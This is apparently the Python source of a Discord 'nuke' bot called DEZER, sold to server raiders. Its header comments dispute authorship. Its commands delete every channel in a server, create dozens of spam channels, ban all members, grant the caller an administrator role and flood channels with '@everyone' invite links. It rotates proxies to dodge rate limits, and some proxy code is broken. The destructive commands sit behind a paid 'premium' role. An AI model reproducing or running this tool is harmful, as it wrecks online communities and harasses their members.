############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################
############################ THIS CODE IS THAT OF DEZER (neptune) |  BUT I HAVE TAKEN SOME OF MY FUNCTIONS FROM HIM SKIDED ############################

### THIS CODE WAS MADE BY ME FOR ANDRE4REAL (1161936919018610749), HE PAID ME FOR IT, AFTER A WHILE HE STARTED SKIDDING MY FUNCTIONS. ###
### THIS CODE WAS MADE BY ME FOR ANDRE4REAL (1161936919018610749), HE PAID ME FOR IT, AFTER A WHILE HE STARTED SKIDDING MY FUNCTIONS. ###
### THIS CODE WAS MADE BY ME FOR ANDRE4REAL (1161936919018610749), HE PAID ME FOR IT, AFTER A WHILE HE STARTED SKIDDING MY FUNCTIONS. ###
### THIS CODE WAS MADE BY ME FOR ANDRE4REAL (1161936919018610749), HE PAID ME FOR IT, AFTER A WHILE HE STARTED SKIDDING MY FUNCTIONS. ###


import discord
from discord.ext import commands, tasks
import asyncio
import colorama
from colorama import Fore, Style
import json
import time
import aiohttp
import random
import requests
import subprocess
import os
import concurrent.futures
import threading



intents = discord.Intents.all()


client = commands.Bot(command_prefix="!", intents=intents, help_command=None)




TOKEN = ""
proxies = []
current_proxy =None
protected_servers = [123, 123]
message_counter = {}
scritta = "https://discord.gg/worldz"
PROXIES_FILE = "proxies.json"
current_proxy_index = 0
proxies = []
nuke_message = "https://discord.gg/worldz @everyone"
autonuke = False

async def load_proxies():
    global proxies
    with open(PROXIES_FILE, 'r') as file:
        proxies = json.load(file)

async def change_proxy():
    global current_proxy_index
    current_proxy_index = (current_proxy_index + 1) % len(proxies)
    print(f"Changed proxy: {proxies[current_proxy_index]}")


@client.event
async def on_error(event, *args, **kwargs):
    if isinstance(args[0], discord.errors.HTTPException):
        error = args[0]
        if error.status == 429:
            await change_proxy()

@client.event
async def on_guild_join(guild):
    if len(guild.members) < 1:
        await guild.leave()
        for member in guild.members:
            if not member.bot:
                await member.send("Sorry, I cannot be added to the server because it has less than 30 members!")
                

def premiumadd(title, description):
    embed = discord.Embed(
        title=title,
        description=description,
        color=discord.Color.green()
    )
    return embed


def premiumremove(title, description):
    embed = discord.Embed(
        title=title,
        description=description,
        color=discord.Color.red()
    )
    return embed


def load_data():
    with open('premium_data.json', 'r') as file:
        return json.load(file)

def save_data(data):
    with open('premium_data.json', 'w') as file:
        json.dump(data, file, indent=4)

@client.event
async def on_member_update(before, after):
    target_role_name = "Premium"

    data = load_data()


    target_role = discord.utils.get(after.roles, name=target_role_name)

    if target_role_name in [r.name for r in before.roles] and target_role_name not in [r.name for r in after.roles]:
        if str(after.id) in data["premium_users"]:
            data["premium_users"].remove(str(after.id))

            save_data(data)

            embed = premiumremove(f"Premium Removed", f"{after.mention} is no longer a premium member!")

            channel = after.guild.get_channel(1161968788066021459)

            await channel.send(embed=embed)

    if target_role_name not in [r.name for r in before.roles] and target_role_name in [r.name for r in after.roles]:

        if str(after.id) not in data["premium_users"]:
            data["premium_users"].append(str(after.id))
            save_data(data)

            embed = premiumadd(f"Premium Added", f"{after.mention} is now a premium member!")

            channel = after.guild.get_channel(1161968788066021459)
            await channel.send(embed=embed)


@client.command()
async def p(ctx, member: discord.Member):
    data = load_data()
    
    role_id = 1178760558565138543
    role = discord.utils.get(ctx.guild.roles, id=role_id)

    if role not in ctx.author.roles:
        await ctx.reply("You cannot do this command!")
        return

    if str(member.id) not in data["premium_users"]:
        data["premium_users"].append(str(member.id))
        save_data(data)

        embed = premiumadd(f"Premium Added", f"{member.mention} is now a premium member!")

        channel = ctx.guild.get_channel(1161968788066021459)
        await channel.send(embed=embed)
    else:
        await ctx.send(f"{member.mention} is already a premium member!")
    
@client.command()
async def r(ctx, member: discord.Member):
    data = load_data()

    role_id = 1178760558565138543
    role = discord.utils.get(ctx.guild.roles, id=role_id)

    if role not in ctx.author.roles:
        await ctx.reply("You cannot do this command")
        return

    if str(member.id) in data["premium_users"]:
        data["premium_users"].remove(str(member.id))
        save_data(data)

        embed = premiumremove(f"Premium Removed", f"{member.mention} is no longer a premium member!")

        channel = ctx.guild.get_channel(1161968788066021459)
        await channel.send(embed=embed)
    else:
        await ctx.send(f"{member.mention} is not a premium member.")




def get_next_proxy():
    global proxies
    if  not proxies:
        load_proxies()
    if proxies:
        current_proxy = proxies.pop(0)
        proxies.append(current_proxy)


async def make_request(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, proxy=f'http://{current_proxy}') as response:
            return await response.text()





@tasks.loop(hours=1)
async def change_proxy():
    get_next_proxy
    pass




@client.event
async def on_ready():
    print(f"{Fore.GREEN}[+]{Fore.RED}DEZER È ORA ONLINE")
    change_proxy.start()

@client.command()
async def ping(ctx):
    ping = client.latency * 1000
    embed = discord.Embed(
        title="DEZER BOT PING",
        description=f"The bot has: {ping}ms"
    )
    await ctx.send(embed=embed)
        




@client.command()
async def setup(ctx):
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("Nice try, this is a secure server!")
        return

    try:
        await asyncio.gather(*[channel.delete() for channel in guild.channels])
        await asyncio.gather(*[guild.create_text_channel(name="join-DEZER") for _i in range(45)])
    except :
        pass

    max_messages_per_channel = 4

    async def send_messages(channel):
        for _i in range(max_messages_per_channel):
            try:
                for _i in range(4):
                    await channel.send("Nuked by https://discord.gg/worldz @everyone")
                    await asyncio.sleep(0.3)
            except:
                pass





@client.command()
async def proxy(ctx, *new_proxies):  
    added_proxies = []  

    for new_proxy in new_proxies:
        new_proxy = new_proxy.strip()
        if new_proxy:
            proxies.append(new_proxy)
            added_proxies.append(new_proxy)

    if added_proxies:
        with open('proxies.json', 'w') as f:
            json.dump(proxies, f)
        
        added_proxies_str = "\n".join(added_proxies)
        await ctx.send(f'{added_proxies_str}')
    else:
        await ctx.send('You have some shitty proxies, none work or you haven not added any proxies.')




@client.command()
async def message(ctx, *, user_message):
    user_id = str(ctx.author.id)
    data = load_data()

    if user_id not in data["premium_users"]:
        await ctx.reply("You are not a premium member!")
        return

    guild = ctx.guild

    if guild.id in protected_servers:
        await ctx.reply("Nice try, this is a secure server!")
        return
    
    message = f"{user_message} {scritta}" 
    coroutines = []

    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            for _ in range(1):
                coroutines.append(channel.send(message))
    
    await asyncio.gather(*coroutines)


@client.command()
async def info(ctx):
    server_count = len(client.guilds)
    shard_id = ctx.guild.shard_id if ctx.guild else 0
    shard_count = ctx.bot.shard_count

    embed = discord.Embed(title="INFO",
    color=discord.Color.purple())
    embed.add_field(name="Server:", value=server_count)
    embed.add_field(name="Shard ID:", value=shard_id)
    await ctx.send(embed=embed)




@client.command()
async def ban(ctx):
    user_id = str(ctx.author.id)
    data = load_data()

    if user_id not in data["premium_users"]:
        await ctx.reply("You are not a premium member!")
        return

    guild = ctx.guild

    if guild.id in protected_servers:
        await ctx.reply("Nice try, this is a secure server!")
        return

    if ctx.author.guild_permissions.administrator:
        for member in ctx.guild.members:
            if member != ctx.author:
                try:
                    await member.ban(reason=".gg/worldz")
                except:
                    print('Error during ban')



@client.command(pass_context=True)
async def admin(ctx):
    user_id = str(ctx.author.id)
    data = load_data()

    if user_id not in data["premium_users"]:
        await ctx.reply("You are not a premium member!")
        return

    guild = ctx.guild

    if guild.id in protected_servers:
        await ctx.reply("Nice try, this is a secure server!")
        return
    try:
        role = await guild.create_role(name="DEZER", permissions=discord.Permissions(8),colour=discord.Colour(000000))
        authour = ctx.message.author
        await ctx.message.delete()
        await authour.add_roles(role)
        pass
    except:
        pass

    


@client.command()
async def stop(ctx):
    role_id = 1162021618952982539
    role = discord.utils.get(ctx.guild.roles, id=role_id)

    if role in ctx.author.roles:
        try:
            await ctx.send("Stopping...")
            await client.close()
        except Exception as e:
            await ctx.send(f"An error occurred while stopping the bot: {str(e)}")
    else:
        await ctx.reply("You cannot do this!")





@client.event
async def on_guild_channel_create(channel):
    if channel.guild.id in protected_servers:
        return
    else:
        pass
    for _ in range(10):
        try:
            await channel.send(nuke_message)
        except:
            pass


client.run(TOKEN)